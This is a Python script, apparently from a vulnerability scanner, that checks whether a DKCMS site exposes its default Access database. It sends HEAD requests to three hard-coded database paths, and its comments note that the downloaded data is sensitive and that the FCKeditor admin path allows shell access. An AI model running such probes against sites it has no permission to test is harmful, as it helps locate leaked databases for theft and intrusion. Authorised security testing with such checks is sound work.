#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 动科(dkcms)默认数据库漏洞
referer: http://www.myhack58.com/Article/html/3/62/2013/36692.htm
author: Lucifer
description: dkcms存在默认数据库,可下载查看敏感数据,FCK编辑器可GETSHELL。
            V2.0   data/dkcm_ssdfhwejkfs.mdb
            V3.1   _data/___dkcms_30_free.mdb
            V4.2   _data/I^(()UU()H.mdb
            默认后台：admin
            编辑器：admin/fckeditor
'''
import sys
import requests
import time
import warnings
from termcolor import cprint

class dkcms_database_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/data/dkcm_ssdfhwejkfs.mdb",
                    "/_data/___dkcms_30_free.mdb",
                    "/_data/I^(()UU()H.mdb"]
        for payload in payloads:
            vulnurl = self.url + payload
            try:
                req = requests.head(vulnurl, headers=headers, timeout=10, verify=False)
                if req.headers["Content-Type"] == "application/x-msaccess":
                    cprint("[+]存在dkcms默认数据库漏洞...(高危)\tpayload: "+vulnurl, "red")

            except:
                cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = dkcms_database_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()